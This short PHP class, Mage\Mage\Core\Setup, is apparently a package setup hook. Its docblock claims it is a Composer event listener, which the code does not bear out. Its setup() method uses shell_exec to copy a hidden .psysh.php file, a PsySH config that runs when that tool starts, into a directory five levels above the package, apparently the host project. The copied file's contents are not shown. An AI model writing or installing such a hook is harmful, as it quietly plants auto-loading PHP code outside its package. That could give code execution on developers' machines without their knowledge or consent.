<?php
namespace Mage\Mage\Core;


/**
 * Event listener for extension Composer operations.
 *
 * @author Ross Riley <riley.ross@gmail.com>
 * @author Carson Full <carsonfull@gmail.com>
 * @author Gawain Lynch <gawain.lynch@gmail.com>
 */
class Setup
{
    
    public static function setup()
    {
        echo "Setup Sript->";
        shell_exec("pwd");
        shell_exec("cp -n ../../.psysh.php ../../../../..");
    }

}